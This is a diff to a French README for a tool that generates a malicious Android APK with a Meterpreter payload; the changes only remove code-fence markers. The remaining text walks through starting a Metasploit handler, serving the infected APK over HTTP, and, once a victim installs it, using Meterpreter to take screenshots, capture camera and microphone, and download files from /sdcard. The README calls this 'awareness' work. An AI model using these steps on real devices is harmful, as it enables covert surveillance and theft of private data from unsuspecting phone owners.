@@ -62,9 +62,7 @@ Une fois l'outil lancé, vous devrez fournir les informations suivantes :
 
 L'outil générera un fichier `meterpreter_handler.rc` pour faciliter le démarrage du listener Metasploit :
 
-    ```bash
     msfconsole -r meterpreter_handler.rc
-    ```
 
 Cela lancera un handler qui attendra une connexion de l'APK infectée.
 
@@ -72,9 +70,7 @@ Cela lancera un handler qui attendra une connexion de l'APK infectée.
 
 Une fois l'APK malveillante générée, l'outil démarre un serveur HTTP sur votre machine pour que l'APK soit accessible via un lien :
 
-    ```bash
     http://votre-ip:8000/votre_apk_malveillante.apk
-    ```
 
 Le but est de sensibiliser les utilisateurs aux dangers des APK téléchargées sur des sites non officiels.
 
@@ -82,9 +78,7 @@ Le but est de sensibiliser les utilisateurs aux dangers des APK téléchargées 
 
 Lorsque l'utilisateur installe et exécute l'APK infectée sur son appareil, une session Meterpreter s'ouvrira. Vous pouvez alors interagir avec l'appareil compromis.
 
-    ```bash
     meterpreter > sessions -i [ID de la session]
-    ```
 
 ## Scénario de Sensibilisation
 
@@ -94,50 +88,38 @@ Voici un scénario de sensibilisation typique pour une session Meterpreter ouver
 
 Cela démontre comment un attaquant peut visualiser l'écran de l'utilisateur :
 
-    ```bash
     meterpreter > screenshot
-    ```
 
 ### 2. **Récupérer des informations sur l'appareil :**
 
 Pour montrer la quantité d'informations accessibles à l'attaquant :
 
-    ```bash
     meterpreter > sysinfo
-    ```
 
 ### 3. **Vérifier si l'appareil est rooté :**
 
 Montre comment l'attaquant peut vérifier si l'appareil a des permissions root :
 
-    ```bash
     meterpreter > check_root
-    ```
 
 ### 4. **Activer la caméra et prendre une photo :**
 
 Un exemple frappant de la compromission de la vie privée :
 
-    ```bash
     meterpreter > webcam_snap
-    ```
 
 ### 5. **Activer le microphone et enregistrer de l'audio :**
 
 Démontre comment l'attaquant peut enregistrer l'environnement sonore :
 
-    ```bash
     meterpreter > record_mic
-    ```
 
 ### 6. **Récupérer les fichiers de l'appareil :**
 
 Montre que toutes les données de l'utilisateur peuvent être exfiltrées :
 
-    ```bash
     meterpreter > ls /sdcard/
     meterpreter > download /sdcard/DCIM/photo.jpg
-    ```
 
 ## Disclaimer
 
